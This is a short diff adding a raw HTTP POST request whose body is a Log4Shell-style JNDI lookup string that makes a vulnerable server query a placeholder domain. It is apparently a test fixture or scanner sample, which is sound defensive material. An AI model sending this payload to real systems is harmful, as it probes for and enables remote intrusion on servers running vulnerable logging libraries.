@@ -1,0 +1,5 @@
+POST /a HTTP/1.1
+Host: t
+Content-Length: 21
+
+${jndi:dns://d.tld/x}
